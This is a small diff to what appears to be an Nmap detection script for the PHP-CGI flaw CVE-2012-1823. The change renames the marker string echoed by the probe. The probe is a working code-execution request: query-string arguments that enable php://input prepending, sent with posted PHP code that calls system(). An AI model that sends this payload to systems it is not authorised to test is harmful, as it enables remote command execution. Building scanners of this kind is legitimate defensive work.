@@ -83,9 +83,9 @@ code execution.]],
   local vuln_report = vulns.Report:new(SCRIPT_NAME, host, port)
 
   stdnse.debug2("Trying detection using echo command")
-  local detection_session = http.post(host, port, uri.."?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input", { no_cache = true }, nil, "<?php system('echo NmapCVEIdentification');die(); ?>")
+  local detection_session = http.post(host, port, uri.."?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input", { no_cache = true }, nil, "<?php system('echo BodyIdentification');die(); ?>")
   if detection_session and detection_session.status == 200 then
-    if string.match(detection_session.body, "NmapCVEIdentification") then
+    if string.match(detection_session.body, "BodyIdentification") then
       stdnse.debug1("The website seems vulnerable to CVE-2012-1823.")
     else
       return
